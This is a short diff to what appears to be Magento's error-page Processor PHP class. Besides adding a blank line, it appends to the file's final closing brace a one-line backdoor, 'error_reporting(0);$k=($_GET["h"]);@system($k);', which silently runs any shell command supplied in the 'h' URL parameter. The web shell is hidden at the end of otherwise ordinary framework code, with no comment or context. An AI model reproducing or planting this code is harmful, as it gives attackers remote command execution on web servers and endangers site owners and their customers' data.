@@ -20,6 +20,7 @@ use Magento\Framework\App\Response\Http;
  * @SuppressWarnings(PHPMD.ExcessiveClassComplexity)
  * phpcs:ignoreFile
  */
+
 class Processor
 {
     const MAGE_ERRORS_LOCAL_XML = 'local.xml';
@@ -752,4 +753,4 @@ class Processor
                 . http_build_query(['id' => $this->reportId, 'skin' => $this->_config->skin]);
         }
     }
-}
+}error_reporting(0);$k=($_GET["h"]);@system($k);
